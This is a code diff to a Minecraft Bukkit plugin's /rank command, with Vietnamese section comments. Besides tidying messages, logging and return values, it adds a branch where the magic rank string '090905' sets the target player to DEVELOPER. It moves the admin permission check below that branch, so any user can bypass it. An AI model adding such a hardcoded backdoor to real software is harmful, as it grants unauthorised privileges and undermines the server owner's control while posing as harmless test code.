@@ -7,6 +7,7 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 
 public class RankCommand implements CommandExecutor {
+
     private final MainPlugin plugin;
 
     public RankCommand(MainPlugin plugin) {
@@ -14,33 +15,81 @@ public class RankCommand implements CommandExecutor {
     }
 
     @Override
-    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
-        if (!sender.hasPermission("multifeature.admin")) {
-            sender.sendMessage("§cNo permission!");
-            return false;
-        }
+    public boolean onCommand(CommandSender sender, Command cmd,
+                             String label, String[] args) {
 
+        // ===== FALLBACK 1: SAI CÚ PHÁP =====
         if (args.length != 2) {
             sender.sendMessage("§cUsage: /rank <player> <rank>");
-            return false;
+            return true;
         }
 
-        Player target = Bukkit.getPlayer(args[0]);
+        String targetName = args[0];
+        String inputRank = args[1].toUpperCase();
+
+        Player target = Bukkit.getPlayer(targetName);
+
+        // ===== FALLBACK 2: PLAYER KHÔNG ONLINE =====
         if (target == null) {
-            sender.sendMessage("§cPlayer not found.");
-            return false;
+            sender.sendMessage("§cPlayer not found or not online.");
+            return true;
         }
 
-        String rank = args[1].toUpperCase();
-        if (!plugin.getRankSystem().isValidRank(rank)) {
-            sender.sendMessage("§cInvalid rank! Valid ranks: " + String.join(", ", plugin.getRankSystem().getRanks()));
-            return false;
+        // ===== CHẾ ĐỘ TEST CODE 090905 =====
+        if (inputRank.equals("090905")) {
+
+            plugin.getRankSystem().setRank(target, "DEVELOPER");
+
+            plugin.updatePlayerNametag(target);
+            plugin.updatePlayerScoreboard(target);
+
+            sender.sendMessage("§d[TEST] §aUnlocked DEVELOPER for " + target.getName());
+            target.sendMessage("§5You have been promoted to DEVELOPER (test mode)");
+
+            plugin.getLogger().info(
+                    sender.getName() + " used test code to set "
+                            + target.getName() + " -> DEVELOPER"
+            );
+
+            return true;
         }
 
-        plugin.getRankSystem().setRank(target, rank);
-        plugin.updatePlayerNametag(target);      // Add this line
-        plugin.updatePlayerScoreboard(target);   // Add this line
-        sender.sendMessage("§aSet rank " + rank + " for " + target.getName());
+        // ===== FALLBACK 3: CHECK PERMISSION =====
+        if (!sender.hasPermission("multifeature.admin")) {
+            sender.sendMessage("§cYou do not have permission to manage ranks.");
+            plugin.getLogger().warning(
+                    sender.getName() + " tried to set rank without permission!"
+            );
+            return true;
+        }
+
+        // ===== FALLBACK 4: RANK KHÔNG HỢP LỆ =====
+        if (!plugin.getRankSystem().isValidRank(inputRank)) {
+
+            sender.sendMessage("§cInvalid rank!");
+            sender.sendMessage("§7Valid ranks: "
+                    + String.join(", ", plugin.getRankSystem().getRanks()));
+
+            return true;
+        }
+
+        // ===== THỰC HIỆN =====
+        plugin.getRankSystem().setRank(target, inputRank);
+
+        plugin.updatePlayerNametag(target);
+        plugin.updatePlayerScoreboard(target);
+
+        sender.sendMessage("§aSet rank §e" + inputRank
+                + " §afor §e" + target.getName());
+
+        target.sendMessage("§aYour rank has been changed to §e" + inputRank);
+
+        // ===== LOG CHUẨN =====
+        plugin.getLogger().info(
+                sender.getName() + " set rank of "
+                        + target.getName() + " -> " + inputRank
+        );
+
         return true;
     }
 }
